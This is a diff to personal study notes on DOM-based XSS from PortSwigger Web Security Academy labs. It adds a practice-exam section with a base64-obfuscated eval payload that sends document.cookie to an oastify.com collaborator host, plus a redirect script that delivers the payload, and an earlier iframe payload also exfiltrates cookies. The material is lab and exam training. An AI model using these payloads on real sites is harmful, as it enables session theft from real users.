@@ -183,6 +183,26 @@ onload="setTimeout(()=>this.contentWindow.postMessage('<img src onerror=\'docume
 ```html
 <iframe src="https://[LAB_URL]/product?productId=1&x='><img src onerror='fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)'>">
 ```
+
+## Practice Exam
+
+> In the practice exam, I found a DOM XSS, you could use ***DOM Invader*** to find it, it's based on this [lab](#[6.%20Reflected%20DOM%20XSS](https%20//portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected))
+
+> Because it has aggressive filtering we need to use compiled scripts
+
+**XSS**
+
+```js
+"-eval(atob('ZmV0Y2goYC8vamYyMjN6OXc1cDA1enJneDFuM29pc3g0M3Y5bXhkbDIub2FzdGlmeS5jb20/Yz0ke2J0b2EoZG9jdW1lbnQuY29va2llKX1gKQ=='))}//
+```
+
+**Exploiting**
+
+```html
+<script>
+document.location="https://0ab600a304a984828246971e005a00e1.web-security-academy.net/?SearchTerm=%22-eval%28atob%28%27ZmV0Y2goYC8vamYyMjN6OXc1cDA1enJneDFuM29pc3g0M3Y5bXhkbDIub2FzdGlmeS5jb20%2FYz0ke2J0b2EoZG9jdW1lbnQuY29va2llKX1gKQ%3D%3D%27%29%29%7D%2F%2F";
+</script>
+```
 ## Cheat Sheet
 
 [Sources · wisec/domxsswiki Wiki · GitHub](https://github.com/wisec/domxsswiki/wiki/sources)
